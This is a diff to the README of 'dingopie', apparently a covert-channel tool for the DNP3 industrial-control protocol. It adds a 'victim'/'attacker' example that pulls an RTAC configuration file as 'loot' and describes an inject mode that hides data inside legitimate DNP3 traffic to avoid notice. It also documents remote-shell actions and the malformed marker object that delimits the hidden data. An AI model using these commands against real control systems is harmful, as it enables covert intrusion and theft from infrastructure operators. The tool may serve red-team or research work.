@@ -31,6 +31,14 @@ $ dingopie.exe client direct connect -i 131.43.110.7
 dingopie>
 ```
 
+#### Transfer a file over an existing DNP3 connection:
+```bash
+# on victim
+$ dingopie server inject send -f /etc/sel/rtac-config.xml
+# on attacker
+$ dingopie client inject receive -f loot/rtu1-config.xml -j 192.168.0.5
+```
+
 ## Usage
 
 dingopie has three different options: the role, the mode, and the action. Each is required: `dingopie  { server | client }  { direct | inject }  { { send | receive } | { shell | connect } } ...`. Each session needs a `client` on one side and a `server` on the other, and a paired set of actions (either `send` | `receive` or `shell` | `connect`).
@@ -49,9 +57,6 @@ In `direct` mode, dingopie creates a new DNP3 channel. Data is sent in DNP3 Appl
 
 #### `inject`
 
-> [!WARNING]
-> `inject` mode is not implemented yet. See the original [D1N0P13](https://github.com/nblair2/D1N0P13) for an example. This description is included to provide context for future development.
-
 In `inject` mode, dingopie 'rides on top of' an existing DNP3 channel. Data is added to existing DNP3 packets (ostensibly created by a legitimate DNP3 program) as they leave one host, and on the other side this data is removed before allowing the packets to continue on to the legitimate DNP3 program. This will increase the size of packets sent between devices, but will take place over an existing DNP3 connection and is much less likely to be noticed. The disadvantage of filter mode is that its speed is constrained by the channel that it is using.
 
 ### Actions
@@ -62,14 +67,28 @@ Actions are paired, so that each side of a session needs to run one of the actio
 
 * **`shell` | `connect`** - creates a pty on one device and allows the connecting device to run an interactive shell.
 
-> [!NOTE]
-> The `shell` action cannot be run on Windows hosts.
+> [!WARNING]
+> **Missing Implementations:**
+> The `inject` mode and the `shell` action both leverage linux features, so they are currently not supported on Windows.
+> | Mode, Action | Linux | Winddows |
+> | --- | --- | --- |
+> | `direct send` | :white_check_mark: | :white_check_mark: |
+> | `direct receive` | :white_check_mark: | :white_check_mark: |
+> | `direct shell` | :white_check_mark: | :x: |
+> | `direct connect` | :white_check_mark: | :white_check_mark: |
+> | `inject send` | :white_check_mark: | :x: |
+> | `inject receive` | :white_check_mark: | :x: |
+> | `inject shell` | :x: | :x: |
+> | `inject connect` | :x: | :x: |
+
 
 ## Protocol
 
-There are three different message sequences that dingopie uses depending on the role and action pairings.
+### Direct Mode
 
-### Primary (`server direct receive`, `client direct send`)
+There are four different message sequences that dingopie uses depending on the role and action pairings.
+
+#### Primary (`server direct receive`, `client direct send`)
 
 > Example [primary.pcapng.gz](.media/primary.pcapng.gz)
 
@@ -92,7 +111,7 @@ Title: Primary
     s->>c: AckDisconnect (G30V1Q0)
 ```
 
-### Secondary (`server direct send`, `client direct receive`)
+#### Secondary (`server direct send`, `client direct receive`)
 
 > Example [secondary.pcapng.gz](.media/secondary.pcapng.gz)
 
@@ -113,7 +132,7 @@ Title: Secondary
     s->>c: Disconnect (G30V1Q0)
 ```
 
-###  Shell (both `direct shell` and `direct connect` combinations)
+####  Shell (both `direct shell` and `direct connect` combinations)
 
 > Example [shell.pcapng.gz](.media/shell.pcapng.gz)
 
@@ -129,3 +148,9 @@ Title: Shell
         s->>c: SendData (G30V3)
     end
 ``` 
+
+### Inject Mode
+
+> Example [inject.pcapng.gz](.media/inject.pcapng.gz)
+
+In inject mode, dingopie is subordinate to the existing legitimate DNP3 channel. The rate and structure of the traffic will remain that of the legitimate channel, but the size of each packet will increase. Data is added to the end of DNP3 packets as they leave one host, and removed on the other side before allowing the packets to continue on to the legitimate DNP3 program. To mark the start of the data, dingopie constructs a DNP3 object that is non-protocol-conforming in 3 respects: the first bit of the qualifier octet is set (should be 0), the object prefix code is 7 (reserved), and the range specifier code is A (reserved). All data following an object with these characteristics, up to the end of the frame is a part of the covert channel. A packet with less data than could have been packed into the frame, or a packet with no data signals the end of the message.
